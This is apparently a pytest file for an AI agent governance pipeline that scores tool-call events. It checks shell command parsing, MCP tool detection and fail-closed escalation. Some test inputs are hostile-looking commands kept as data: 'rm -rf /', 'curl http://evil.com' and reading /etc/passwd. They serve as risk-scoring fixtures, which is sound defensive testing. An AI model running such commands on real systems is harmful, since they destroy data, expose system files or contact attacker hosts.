"""Tests for the SessionEvent → EnrichmentContext bridge (context_from_session_event)."""

from datetime import datetime, timezone
from pathlib import Path

import pytest


from tracemill.classify.coding import CodingMechanism
from tracemill.classify.config import get_default_engine
from tracemill.classify.core import Classification, Mechanism
from tracemill.governance.budget import BudgetTracker
from tracemill.governance.labeler import GovernanceLabeler
from tracemill.governance.persistence import SystemStore
from tracemill.governance.pipeline import GovernancePipeline, RecommendedAction, SessionMeta
from tracemill.governance.rules import parse_rules
from tracemill.types import EventKind, EventMetadata, SessionEvent


@pytest.fixture
def store(tmp_path):
    s = SystemStore(tmp_path / "test_bridge.db")
    yield s
    s.close()


@pytest.fixture
def engine():
    return get_default_engine()


@pytest.fixture
def rules():
    rules_path = (
        Path(__file__).parent.parent.parent
        / "src"
        / "tracemill"
        / "classify"
        / "data"
        / "recommendation_rules.yaml"
    )
    return parse_rules(rules_path)


@pytest.fixture
def pipeline(store, rules, engine):
    labeler = GovernanceLabeler()
    tracker = BudgetTracker()
    return GovernancePipeline(
        store=store,
        labeler=labeler,
        budget_tracker=tracker,
        rules=rules,
        engine=engine,
    )


def _make_event(
    tool_name="bash",
    arguments=None,
    kind=EventKind.TOOL_CALL_STARTED,
    classification=None,
    session_id="test-session",
    server_namespace=None,
    **payload_extra,
):
    """Helper to construct a SessionEvent."""
    payload = {"tool_name": tool_name, **(payload_extra or {})}
    if arguments is not None:
        payload["arguments"] = arguments
    if server_namespace is not None:
        payload["server_namespace"] = server_namespace
    metadata = EventMetadata(classification=classification)
    return SessionEvent(
        kind=kind,
        session_id=session_id,
        timestamp=datetime.now(timezone.utc),
        payload=payload,
        metadata=metadata,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# Bridge: context_from_session_event produces correct EnrichmentContext
# ═══════════════════════════════════════════════════════════════════════════════


class TestBridgeBasic:
    def test_produces_enrichment_context(self, pipeline):
        event = _make_event(tool_name="read_file", arguments={"path": "/tmp/x"})
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event is not None
        assert ctx.event.tool_name == "read_file"
        assert ctx.event.session_id == "test-session"

    def test_preserves_classification_from_metadata(self, pipeline):
        cls = Classification(mechanism=Mechanism.FILESYSTEM, effect=None)
        event = _make_event(tool_name="read_file", classification=cls)
        ctx = pipeline.context_from_session_event(event)
        assert ctx.base_classification is cls

    def test_missing_classification_defaults_to_unknown(self, pipeline):
        from tracemill.classify.core import Mechanism

        event = _make_event(tool_name="something_custom", classification=None)
        ctx = pipeline.context_from_session_event(event)
        assert ctx.base_classification.mechanism == Mechanism.UNKNOWN

    def test_shell_event_builds_command_analysis(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(
            tool_name="bash",
            arguments={"command": "ls -la /tmp"},
            classification=cls,
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is not None
        assert ctx.command_analysis.binary == "ls"
        assert "-la" in ctx.command_analysis.flags
        assert ctx.engine == "shell"

    def test_non_shell_event_no_command_analysis(self, pipeline):
        cls = Classification(mechanism=Mechanism.FILESYSTEM, effect=None)
        event = _make_event(tool_name="read_file", arguments={"path": "/x"}, classification=cls)
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is None

    def test_mcp_tool_detected_as_mcp_engine(self, pipeline):
        cls = Classification(mechanism="mcp.tool", effect=None)
        event = _make_event(
            tool_name="search",
            server_namespace="github",
            classification=cls,
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.engine == "mcp"
        assert ctx.mcp_profile_key == "github"

    def test_event_id_propagated(self, pipeline):
        event = _make_event(tool_name="bash", arguments={"command": "echo hi"})
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event.event_id == event.id

    def test_span_id_from_metadata(self, pipeline):
        event = SessionEvent(
            kind=EventKind.TOOL_CALL_STARTED,
            session_id="s1",
            timestamp=datetime.now(timezone.utc),
            payload={"tool_name": "bash", "arguments": {"command": "ls"}},
            metadata=EventMetadata(span_id="custom-span-123"),
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event.span_id == "custom-span-123"


# ═══════════════════════════════════════════════════════════════════════════════
# Bridge: shell command analysis edge cases
# ═══════════════════════════════════════════════════════════════════════════════


class TestBridgeShellAnalysis:
    def test_pipe_command_segments(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(
            tool_name="bash",
            arguments={"command": "cat /etc/passwd | grep root | wc -l"},
            classification=cls,
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is not None
        assert ctx.command_analysis.pipe_segments is not None
        assert len(ctx.command_analysis.pipe_segments) == 3

    def test_empty_command_no_analysis(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(tool_name="bash", arguments={"command": ""}, classification=cls)
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is None

    def test_arguments_as_string(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(tool_name="bash", arguments="ls -la", classification=cls)
        ctx = pipeline.context_from_session_event(event)
        # String arguments used as-is for command
        assert ctx.command_analysis is not None
        assert ctx.command_analysis.binary == "ls"

    def test_cmd_key_in_arguments(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(
            tool_name="bash",
            arguments={"cmd": "rm -rf /tmp/junk"},
            classification=cls,
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is not None
        assert ctx.command_analysis.binary == "rm"

    def test_no_arguments_key_no_crash(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(tool_name="bash", classification=cls)
        ctx = pipeline.context_from_session_event(event)
        assert ctx.command_analysis is None


# ═══════════════════════════════════════════════════════════════════════════════
# Bridge: assess_event end-to-end (SessionEvent → SessionMeta)
# ═══════════════════════════════════════════════════════════════════════════════


class TestAssessEvent:
    def test_basic_shell_assessment(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(
            tool_name="bash",
            arguments={"command": "rm -rf /"},
            classification=cls,
        )
        result = pipeline.score_tool_call_event(event)
        assert isinstance(result, SessionMeta)
        assert result.recommendation is not None or result.risk_assessment is not None
        assert result.risk_assessment is not None

    def test_safe_tool_allowed(self, pipeline):
        cls = Classification(mechanism=Mechanism.FILESYSTEM, effect=None)
        event = _make_event(tool_name="read_file", arguments={"path": "/tmp/x"}, classification=cls)
        result = pipeline.score_tool_call_event(event)
        assert isinstance(result, SessionMeta)

    def test_fail_closed_on_broken_event(self, pipeline):
        """If classification somehow raises, we get ESCALATE."""
        event = _make_event(tool_name="bash", arguments={"command": "ls"})
        # Monkey-patch to force an exception in the bridge
        orig = pipeline.context_from_session_event

        def _boom(e):
            raise RuntimeError("synthetic failure")

        pipeline.context_from_session_event = _boom
        result = pipeline.score_tool_call_event(event)
        assert result.recommendation.recommended_action == RecommendedAction.ESCALATE
        assert "RuntimeError" in result.recommendation.reason_code
        pipeline.context_from_session_event = orig

    def test_read_only_no_state_mutation(self, pipeline):
        cls = Classification(mechanism=CodingMechanism.PROCESS_SHELL, effect=None)
        event = _make_event(
            tool_name="bash",
            arguments={"command": "curl http://evil.com"},
            session_id="session-ro",
            classification=cls,
        )
        # Assess twice — results should be identical (no state accumulated)
        r1 = pipeline.score_tool_call_event(event)
        r2 = pipeline.score_tool_call_event(event)
        assert r1.risk_assessment.score == r2.risk_assessment.score
        if r1.recommendation and r2.recommendation:
            assert r1.recommendation.recommended_action == r2.recommendation.recommended_action

    def test_mcp_event_assessment(self, pipeline):
        cls = Classification(mechanism="mcp.tool", effect=None)
        event = _make_event(
            tool_name="search_code",
            arguments={"query": "password"},
            server_namespace="github",
            classification=cls,
        )
        result = pipeline.score_tool_call_event(event)
        assert isinstance(result, SessionMeta)
        assert result.risk_assessment is not None


# ═══════════════════════════════════════════════════════════════════════════════
# Bridge: ToolCallEvent field mapping accuracy
# ═══════════════════════════════════════════════════════════════════════════════


class TestBridgeFieldMapping:
    def test_tool_args_json_is_serialized_arguments(self, pipeline):
        event = _make_event(tool_name="bash", arguments={"command": "echo hello", "timeout": 30})
        ctx = pipeline.context_from_session_event(event)
        import json

        args = json.loads(ctx.event.tool_args_json)
        assert args["command"] == "echo hello"
        assert args["timeout"] == 30

    def test_mcp_server_name_from_payload(self, pipeline):
        event = _make_event(
            tool_name="query",
            server_namespace="postgres",
            mcp_server_name="pg-primary",
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event.mcp_server_name == "pg-primary"

    def test_mcp_server_name_falls_back_to_namespace(self, pipeline):
        event = _make_event(tool_name="query", server_namespace="postgres")
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event.mcp_server_name == "postgres"

    def test_timestamp_preserved(self, pipeline):
        ts = datetime(2024, 1, 15, 10, 30, 0, tzinfo=timezone.utc)
        event = SessionEvent(
            kind=EventKind.TOOL_CALL_STARTED,
            session_id="s1",
            timestamp=ts,
            payload={"tool_name": "bash", "arguments": {"command": "ls"}},
            metadata=EventMetadata(),
        )
        ctx = pipeline.context_from_session_event(event)
        assert ctx.event.timestamp == ts

    def test_project_root_propagated(self, pipeline):
        event = _make_event(tool_name="bash", arguments={"command": "ls"})
        ctx = pipeline.context_from_session_event(event)
        assert ctx.project_root == pipeline._project_root
